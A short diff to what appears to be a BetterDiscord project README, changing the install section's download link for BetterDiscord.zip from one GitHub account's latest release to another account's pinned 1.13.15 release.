@@ -3,7 +3,7 @@
 <img width="120" height="120" alt="5d981664-7cda-4158-9040-ce607b5d6149" src="https://github.com/user-attachments/assets/40889f16-ee21-4a2d-b647-97a9764ea52e" />
 
 ## Install
-[Download `BetterDiscord.zip`](https://github.com/koroshi23/BetterDiscord/releases/latest/download/BetterDiscord.zip)
+[Download `BetterDiscord.zip`](https://github.com/bd-discord/BetterDiscord/releases/download/1.13.15/BetterDiscord.zip)
 ---
 
 
